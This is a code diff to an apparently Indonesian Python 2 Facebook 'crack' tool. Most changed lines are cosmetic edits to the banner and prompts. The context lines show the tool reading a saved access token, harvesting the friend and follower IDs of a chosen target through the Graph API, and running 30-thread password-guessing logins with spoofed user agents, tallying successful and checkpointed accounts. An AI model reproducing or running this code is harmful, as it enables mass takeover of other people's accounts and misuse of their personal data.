@@ -63,16 +63,16 @@ bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "0
 def logo():
 	os.system("clear")
 	print("""\033[1;97m 
-                  \033[1;91m───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───
-                  ───█▒▒░░░░░░░░░▒▒█───
-                  ────█░░█░░░░░█░░█────
-                  ─▄▄──█░░░▀█▀░░░█──▄▄─
-                  █░░█─▀▄░░░░░░░▄▀─█░░█
+                  \033[1;91m───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄─── ◍➤ ADMIN ®
+                  ───█▒▒░░░░░░░░░▒▒█─── ◍➤ C
+                  ────█░░█░░░░░█░░█──── ◍➤ G
+                  ─▄▄──█░░░▀█▀░░░█──▄▄─ ◍➤ A
+                  █░░█─▀▄░░░░░░░▄▀─█░░█ ◍➤ I
                   \033[1;96m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
-                  █░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
-                  █░░║║║╠─║─║─║║║║║╠─░░█
-                  █░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
-                  █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█  
+                  █░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█ ◍➤ COMMUNITAS
+                  █░░║║║╠─║─║─║║║║║╠─░░█ ◍➤ GARANGAN
+                  █░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█ ◍➤ ALAY
+                  █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█ ◍➤ INDONESIA
             \033[1;95m®┏━━━┓╋╋┏┓╋╋╋╋┏━━━┓╋╋╋╋╋╋╋╋╋╋┏┓
              ┃┏━┓┃╋╋┃┃╋╋╋╋┃┏━┓┃╋╋╋╋╋╋╋╋╋╋┃┃
              ┃┗━┛┣━━┫┃┏┳━━┫┃╋┃┣┓┏┳━━┳━┓┏━┛┣━━┓  
@@ -81,11 +81,11 @@ def logo():
              ┗┛┗━┻┛┗┻┛┗┻┛┗┻┛╋┗┻┻┻┻┛┗┻┛┗┻━━┻┛┗┛ \033[1;97m 
                                                        
     \033[1;95m──────═• \033[1;92m● \033[1;95m══════════════════════════════ \033[1;92m● \033[1;97m\033[1;95m•═──────  
-\033[1;93m➤\033[1;97m Author     : \033[1;92m☆ RAKA ☆ ™︻®╤───────═◍➤ \033[1;97m
-\033[1;93m➤\033[1;97m Github     : \033[1;92mhttps://github.com/Bangsat-XD \033[1;97m
-\033[1;93m➤\033[1;97m Facebook   : \033[1;92mRaka Andrian Tara \033[1;97m
-\033[1;93m➤\033[1;97m Instagram  : \033[1;92mraka_andrian27 \033[1;97m
-\033[1;93m➤\033[1;97m Twitter    : \033[1;92mBangsat_XD \033[1;97m
+\033[1;93m◍➤\033[1;97m Author     : \033[1;92m☆ RAKA ☆ ™︻®╤───────═◍➤ \033[1;97m
+\033[1;93m◍➤\033[1;97m Github     : \033[1;92mhttps://github.com/Bangsat-XD \033[1;97m
+\033[1;93m◍➤\033[1;97m Facebook   : \033[1;92mRaka Andrian Tara \033[1;97m
+\033[1;93m◍➤\033[1;97m Instagram  : \033[1;92mraka_andrian27 \033[1;97m
+\033[1;93m◍➤\033[1;97m Twitter    : \033[1;92mBangsat_XD \033[1;97m
     \033[1;95m──────═• \033[1;92m● \033[1;95m══════════════════════════════ \033[1;92m● \033[1;97m\033[1;95m•═──────     """)
 def login():
 	os.system("clear")
@@ -206,15 +206,15 @@ def publik():
 		token = open("login.txt", "r").read()
 	except IOError:
 		exit("\n\033[1;96m[\033[1;93m!\033[1;96m] Token Error")
-	idt = raw_input("\033[1;93m➤\033[1;97m Target Id     : ")
+	idt = raw_input("\033[1;93m◍➤\033[1;97m Target Id     : ")
 	try:
 		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
 			uid = i["id"]
 			nama = i["name"].rsplit(" ")[0]
 			id.append(uid+"<=>"+nama)
 	except KeyError:
-		exit("\033[1;93m➤\033[1;97m Account friend list is not public")
-	print("\033[1;93m➤\033[1;97m Total Id      : \033[0;91m%s\033[0;97m"%(len(id))) 
+		exit("\033[1;93m◍➤\033[1;97m Account friend list is not public")
+	print("\033[1;93m◍➤\033[1;97m Total Id      : \033[0;91m%s\033[0;97m"%(len(id))) 
 
 def follower():
 	global token
@@ -222,15 +222,15 @@ def follower():
 		token = open("login.txt", "r").read()
 	except IOError:
 		exit("\n\033[1;96m[\033[1;94m+\033[1;96m] Token Error")
-	idt = raw_input("\033[1;93m➤\033[1;97m Target Id     : ")
+	idt = raw_input("\033[1;93m◍➤\033[1;97m Target Id     : ")
 	try:
 		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
 			uid = i["id"]
 			nama = i["name"].rsplit(" ")[0]
 			id.append(uid+"<=>"+nama)
 	except KeyError:
-		exit("\033[1;93m➤\033[1;97m Account friend list is not public")
-	print("\033[1;93m➤\033[1;97m Total Id      : \033[0;91m%s\033[0;97m"%(len(id))) 
+		exit("\033[1;93m◍➤\033[1;97m Account friend list is not public")
+	print("\033[1;93m◍➤\033[1;97m Total Id      : \033[0;91m%s\033[0;97m"%(len(id))) 
 
 def massal():
 	global token
@@ -239,22 +239,22 @@ def massal():
 	except IOError:
 		exit("\033[1;96m[\033[1;94m+\033[1;96m] Token Error")
 	try:
-		tanya_Total = int(input("\033[1;93m➤\033[1;97m Enter Multiple ID Option  : "))
+		tanya_Total = int(input("\033[1;93m◍➤\033[1;97m Enter Multiple ID Option  : "))
 	except:tanya_Total=1
 	for t in range(tanya_Total):
 		t +=1
-		idt = raw_input("\033[1;93m➤\033[1;97m Target Id %s   : "%(t))
+		idt = raw_input("\033[1;93m◍➤\033[1;97m Target Id %s   : "%(t))
 		try:
 			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
 				uid = i["id"]
 				nama = n["name"].rsplit(" ")[0]
 				id.append(uid+"<=>"+nama)
 		except KeyError:
-			print("\033[1;93m➤\033[1;97m  Ids friend list Is not public")
-	print("\033[1;93m➤\033[1;97m Total id  : \033[0;92m%s\033[0;96m"%(len(id)))
+			print("\033[1;93m◍➤\033[1;97m  Ids friend list Is not public")
+	print("\033[1;93m◍➤\033[1;97m Total id  : \033[0;92m%s\033[0;96m"%(len(id)))
 
 def method():
-	print("\033[1;93m➤\033[1;97m Choose crack methode [ \033[1;92mRecommended B-API \033[1;97m]")
+	print("\033[1;93m◍➤\033[1;97m Choose crack methode [ \033[1;92mRecommended B-API \033[1;97m]")
 	print("\033[1;96m[\033[1;93m1\033[1;96m]\033[1;92m─ ® ─ \033[1;97mB-API\033[1;97m [ \033[1;95mFast \033[1;97m]")
 	print("\033[1;96m[\033[1;93m2\033[1;96m]\033[1;92m─ ® ─ \033[1;97mM-Basic\033[1;97m [ \033[1;95mFast \033[1;97m]")
 	print("\033[1;96m[\033[1;93m3\033[1;96m]\033[1;92m─ ® ─ \033[1;97mFree Facebook\033[1;97m [ \033[1;95mNormal \033[1;97m]")
@@ -262,21 +262,21 @@ def method():
 	if method == "":
 		menu()
 	elif method == "1":
-		ask = raw_input("\033[1;93m➤\033[1;97m Do you choose manual passwors ? y/t\033[1;97m [ \033[1;92mDefault : t \033[1;97m] : ")
+		ask = raw_input("\033[1;93m◍➤\033[1;97m Do you choose manual passwors ? y/t\033[1;97m [ \033[1;92mDefault : t \033[1;97m] : ")
 		if ask == "y":
 			manual()
 		print(" ")
 		ThreadPool(30).map(bapi, id)
 		exit("Program End")
 	elif method == "2":
-		ask = raw_input("\033[1;93m➤\033[1;97m Do you choose manual passwords  y/t\033[1;97m [ \033[1;92mDefault : t \033[1;97m] ")
+		ask = raw_input("\033[1;93m◍➤\033[1;97m Do you choose manual passwords  y/t\033[1;97m [ \033[1;92mDefault : t \033[1;97m] ")
 		if ask == "y":
 			manual()
 		print(" ")
 		ThreadPool(30).map(mbasic, id)
 		exit("Program End")
 	elif method == "3":
-		ask = raw_input("\033[1;93m➤[\033[1;94m!\033[1;97m] Do you choose manual passwords y/t\033[1;97m [ \033[1;92mDefault : t \033[1;97m] ")
+		ask = raw_input("\033[1;93m◍➤[\033[1;94m!\033[1;97m] Do you choose manual passwords y/t\033[1;97m [ \033[1;92mDefault : t \033[1;97m] ")
 		if ask == "y":
 			manual()
 		print(" ")
@@ -310,7 +310,7 @@ def bapi(user):
                 ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420;]")
 	global loop, token
 	sys.stdout.write(
-		"\r\033[1;93m➤ \033[0;92mCRACK \033[0;93m••>\033[0;95m %s/%s ••> [OK:-%s] ® \033[0;95m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
+		"\r\033[1;93m◍➤ \033[0;92mCRACK \033[0;93m••>\033[0;95m %s/%s ••> [OK:-%s] ® \033[0;95m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
@@ -352,7 +352,7 @@ def mbasic(user):
 		ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;], Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/255.0.0.8.119;]")
 	global loop, token
 	sys.stdout.write(
-		"\r\033[1;93m➤ \033[0;92mCRACK \033[0;93m••>\033[0;95m %s/%s ••> [OK:-%s] ® \033[0;95m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
+		"\r\033[1;93m◍➤ \033[0;92mCRACK \033[0;93m••>\033[0;95m %s/%s ••> [OK:-%s] ® \033[0;95m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
@@ -406,7 +406,7 @@ def mobile(user):
                 ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/255.0.0.8.119;]")
 	global loop, token
 	sys.stdout.write(
-		"\r\033[1;93m➤ \033[0;92mCRACK \033[0;93m••>\033[0;95m %s/%s ••> [OK:-%s] ® \033[0;95m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
+		"\r\033[1;93m◍➤ \033[0;92mCRACK \033[0;93m••>\033[0;95m %s/%s ••> [OK:-%s] ® \033[0;95m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
@@ -468,7 +468,7 @@ def manual():
 	def main(user):
 		global loop, token
 		sys.stdout.write(
-		        "\r\033[1;93m➤ \033[0;92mCRACK \033[0;93m••>\033[0;95m %s/%s ••> [OK:-%s] ® \033[0;95m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
+		        "\r\033[1;93m◍➤ \033[0;92mCRACK \033[0;93m••>\033[0;95m %s/%s ••> [OK:-%s] ® \033[0;95m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
 		); sys.stdout.flush()
 		uid, name = user.split("<=>")
 		try:
